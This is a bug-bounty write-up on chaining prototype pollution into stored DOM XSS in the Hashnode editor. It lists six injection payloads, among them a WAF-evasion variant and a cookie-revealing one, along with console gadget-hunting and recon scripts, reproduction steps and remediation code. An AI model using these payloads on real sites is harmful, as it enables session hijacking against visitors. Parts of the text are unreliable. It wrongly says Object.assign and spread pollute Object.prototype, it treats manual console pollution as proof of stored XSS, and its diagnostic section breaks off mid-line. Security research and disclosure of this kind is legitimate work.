# Prototype Pollution to Stored XSS BY Hashnode — Step-by-Step Bug Discovery Using Browser Console

**Researcher:** MD Mehedi Hasan (SecurityTalent)

---

## Introduction

Prototype Pollution is a JavaScript vulnerability where an attacker injects properties into `Object.prototype`, affecting all objects in the runtime. When chained with a **gadget** (a property that reaches a dangerous sink like `innerHTML`), it becomes **Stored DOM XSS** — affecting every visitor to the compromised page.

In this guide, I'll show you **how to discover and confirm this vulnerability step-by-step using nothing but the browser's DevTools Console**.

---

## The Working Payloads

### Payload 1 — Basic XSS (alert box)
```javascript
const payload = JSON.parse('{"__proto__":{"innerHTML":"<img src=x onerror=alert(12)>"}}');
```

### Payload 2 — String.fromCharCode bypass (evades WAFs)
```javascript
const payload = JSON.parse('{"__proto__":{"innerHTML":"<img src=x onerror=alert(String.fromCharCode(104,101,108,108,111,32,119,111,114,108,100))>"}}');
```

### Payload 3 — Cookie exfiltration
```javascript
const payload = JSON.parse('{"__proto__":{"innerHTML":"<img src=x onerror=alert(String.fromCharCode(67,111,111,107,105,101,115,58,32)+document.cookie)>"}}');
```

### Payload 4 — defaultView gadget (jQuery-based)
```javascript
const payload = JSON.parse('{"__proto__":{"defaultView":"<img src=x onerror=alert(1)>"}}');
```

### Payload 5 — jQuery context gadget
```javascript
const payload = JSON.parse('{"__proto__":{"context":"<img src=x onerror=alert(12)>"}}');
```

### Payload 6 — srcdoc gadget (iframe override)
```javascript
const payload = JSON.parse('{"__proto__":{"srcdoc":"<img src=x onerror=alert(12)>"}}');
```

---


## POC
[![Hashnode POC](POC/Hashnode.gif)](https://youtu.be/A0xOd3GD0Kk?si=9I5YlA64TOrb8Cpb)


## Step-by-Step Bug Discovery via Console

### Phase 1: Verify the Pollution Source

**Step 1 — Open DevTools in Hashnode blog editor**

Press `F12` or `Ctrl+Shift+I` (Windows/Linux) / `Cmd+Option+I` (Mac) on the target application (e.g., Hashnode blog editor).

**Step 2 — Check baseline state**

In the **Console** tab, run:

```javascript
// Verify clean state — Object.prototype should NOT have these
({}).innerHTML
// Expected: undefined

({}).srcdoc
// Expected: undefined

({}).defaultView
// Expected: undefined

({}).context
// Expected: undefined
```

**Step 3 — Manually pollute Object.prototype**

```javascript
Object.prototype.innerHTML = "<img src=x onerror=alert(12)>";
```

**Step 4 — Confirm pollution**

```javascript
({}).innerHTML
// Expected: "<img src=x onerror=alert(12)>"
```

If this returns your payload, the prototype system is working and you're ready to find the gadget.

---

### Phase 2: Find the Gadget Sink

The gadget is the code that reads a property (like `innerHTML`) from an object where it's undefined — causing it to fall through to `Object.prototype` and then assign it to the DOM.

**Method A — Stack trace trap**

Important: innerHTML is defined on Element.prototype, not HTMLElement.prototype. Using HTMLElement.prototype will throw Cannot read properties of undefined (reading 'set'). Use this corrected version:

```javascript
// Set a trap on innerHTML property reads
// CORRECTED TRAP — Uses Element.prototype instead of HTMLElement.prototype
const desc = Object.getOwnPropertyDescriptor(Element.prototype, 'innerHTML')
          || Object.getOwnPropertyDescriptor(HTMLElement.prototype, 'innerHTML');

if (desc && desc.set) {
    const origSet = desc.set;
    Object.defineProperty(Element.prototype, 'innerHTML', {
        set(value) {
            if (typeof value === 'string' && value.includes('<img')) {
                console.warn('[!] Malicious innerHTML being assigned!');
                console.trace();
                debugger;  // Execution pauses here — inspect the call stack
            }
            return origSet.call(this, value);
        }
    });
    console.log('✅ Trap set successfully on Element.prototype.innerHTML');
} else {
    console.error('❌ Could not find innerHTML descriptor. Trying fallback...');
    
    // Fallback: Trap on all existing elements
    document.querySelectorAll('*').forEach(el => {
        const elDesc = Object.getOwnPropertyDescriptor(el, 'innerHTML');
        if (elDesc && elDesc.set) {
            Object.defineProperty(el, 'innerHTML', {
                set(value) {
                    if (typeof value === 'string' && value.includes('<img')) {
                        console.warn('[!] Malicious innerHTML being set on element:', el);
                        console.trace();
                        debugger;
                    }
                    return elDesc.set.call(this, value);
                }
            });
        }
    });
    console.log('✅ Fallback trap set on existing elements');
}
```

Now pollute the prototype and interact with the page:

```javascript
Object.prototype.innerHTML = "<img src=x onerror=alert(12)>";
// Click around the editor, preview, publish — the debugger will catch it
```

**Method B — Property access logger**

```javascript
// Log every time Object.prototype.innerHTML is accessed
const handler = {
    get(target, prop) {
        if (prop === 'innerHTML' || prop === 'srcdoc' || prop === 'defaultView') {
            console.log(`[!] ${prop} accessed from prototype chain`);
            console.trace();
        }
        return target[prop];
    }
};

// This won't directly intercept, so use the debugger approach above
```

---

### Phase 3: Test Each Gadget

Run each of these separately and watch for the alert:

```javascript
// Test innerHTML gadget
Object.prototype.innerHTML = "<img src=x onerror=alert(1)>";

// Clear with:
delete Object.prototype.innerHTML;

// Test srcdoc gadget
Object.prototype.srcdoc = "<img src=x onerror=alert(2)>";

// Clear with:
delete Object.prototype.srcdoc;

// Test defaultView gadget
Object.prototype.defaultView = "<img src=x onerror=alert(3)>";

// Clear with:
delete Object.prototype.defaultView;

// Test context gadget
Object.prototype.context = "<img src=x onerror=alert(4)>";

// Clear with:
delete Object.prototype.context;
```

**Which one fires an alert?** That's your confirmed gadget for this specific application.

---

### Phase 4: Full Recon Script

Run this complete reconnaissance script and screenshot the results:

```javascript
console.log('=== PROTOTYPE POLLUTION RECON SecurityTalent===');
console.log('Researcher: MD Mehedi Hasan (SecurityTalent)');
console.log('');

// 1. Check baseline
console.log('[1] Checking baseline state...');
const baseline = {
    innerHTML: ({}).innerHTML,
    srcdoc: ({}).srcdoc,
    defaultView: ({}).defaultView,
    context: ({}).context
};
console.table(baseline);
console.log('');

// 2. Test each gadget
const gadgets = ['innerHTML', 'srcdoc', 'defaultView', 'context'];
gadgets.forEach(g => {
    Object.prototype[g] = `<img src=x onerror=console.log('${g} gadget triggered')>`;
    console.log(`[2] Polluted Object.prototype.${g}`);
    console.log(`    Check: ({}).${g} =`, ({})[g]);
});

// 3. Check if any existing properties are already polluted
console.log('');
console.log('[3] Checking existing Object.prototype custom properties:');
const customProps = [];
for (let key in Object.prototype) {
    const builtIn = ['constructor', 'toString', 'valueOf', 'hasOwnProperty',
                     'isPrototypeOf', 'propertyIsEnumerable', 'toLocaleString'];
    if (!builtIn.includes(key)) {
        customProps.push({ property: key, value: Object.prototype[key] });
    }
}
console.table(customProps);

// 4. Cleanup
console.log('');
console.log('[4] Cleaning up test pollution...');
gadgets.forEach(g => {
    try { delete Object.prototype[g]; } catch(e) {}
});
console.log('Cleanup complete.');
console.log('');
console.log('=== RECON COMPLETE ===');
```

---

## Steps to Reproduce (Full Exploit)

```
1. Navigate to the Hashnode target application blog editor
2. Open DevTools Console (F12)
3. Inject one of the JSON.parse payloads via the content field
   or a merge operation
4. Preview or publish the blog post
5. Observe JavaScript execution — alert box fires with
   decoded message or cookies
6. Confirm pollution:
   ({}).innerHTML
   → Returns: "<img src=x onerror=alert(12)>"
```

---

## How JSON.parse Enables This

When `JSON.parse('{"__proto__":{"innerHTML":"..."}}')` runs, `__proto__` is treated as a **regular property key** (not the special accessor). The parsed object has an own property called `__proto__` containing `{innerHTML: "..."}`.

When the application later merges this object into another using a recursive merge function (like `_.merge()`, `Object.assign()`, or spread operator), the merge iterates the keys and does:

```javascript
target["__proto__"]["innerHTML"] = "..."
```

Since `__proto__` on `target` is actually a getter/setter that accesses `Object.prototype`, this effectively runs:

```javascript
Object.prototype.innerHTML = "..."
```

**Every object in the page now inherits `.innerHTML`** — including any configuration or options object that the application later reads.

---

## Impact

| Impact | Description |
|--------|-------------|
| **Session Hijacking** | `document.cookie` exfiltration to attacker server |
| **Account Takeover** | Stolen auth tokens combined with CSRF |
| **Arbitrary JS Execution** | `fetch()` to exfiltrate data, keylogging, DOM manipulation |
| **Global Propagation** | Every visitor to the compromised post is affected — not just the attacker |

---

## Remediation

```javascript
// 1. Block dangerous keys at input layer
function sanitizeKeys(obj) {
    const blocked = new Set(['__proto__', 'constructor', 'prototype']);
    for (let key in obj) {
        if (blocked.has(key)) delete obj[key];
        else if (typeof obj[key] === 'object') sanitizeKeys(obj[key]);
    }
    return obj;
}

// 2. Use prototype-free objects for config
const config = Object.create(null);
// config.__proto__ is undefined — no prototype chain to pollute

// 3. Sanitize HTML before DOM insertion
const safe = DOMPurify.sanitize(userInput);
element.innerHTML = safe;  // Only if absolutely necessary

// 4. Prefer textContent over innerHTML
element.textContent = userInput;  // Safe by default

// 5. Implement strict CSP
// Content-Security-Policy: default-src 'self';
// script-src 'nonce-{random}' 'strict-dynamic';
```

---

# Debugging: Why Alert Might Not Fire
Run this diagnostic:
```js
console.log('=== DIAGNOSTIC ===');

// 1. Is pollution actually working?
Object.prototype.innerHTML = "<img src=x onerror=alert(12)>";
console.log('Pollution confirmed:', ({ }).innerHTML);

// 2. Is the page using innerHTML somewhere?
// Check if any DOM
```



## Conclusion

Prototype Pollution to Stored XSS is a critical vulnerability chain because:

1. **Server-side storage** — one injection affects every visitor
2. **Global pollution** — `Object.prototype` modification persists for the entire page lifetime
3. **Hard to detect** — standard XSS scanners won't find prototype pollution sinks
4. **Easy to confirm** — just three lines in the browser console

The key to finding these bugs is:
- **Identify the source** — where does user input get merged into objects?
- **Find the gadget** — what property does the app read that falls through to the prototype?
- **Chain them** — pollute the property, watch the XSS fire

**Always ensure you have explicit authorization before testing on any live system. This research was conducted with proper authorization as part of a legitimate security assessment.**

---

*Researcher: MD Mehedi Hasan (SecurityTalent)*  
*Tags: `#prototype-pollution` `#xss` `#dom-xss` `#bug-bounty` `#security` `#javascript`*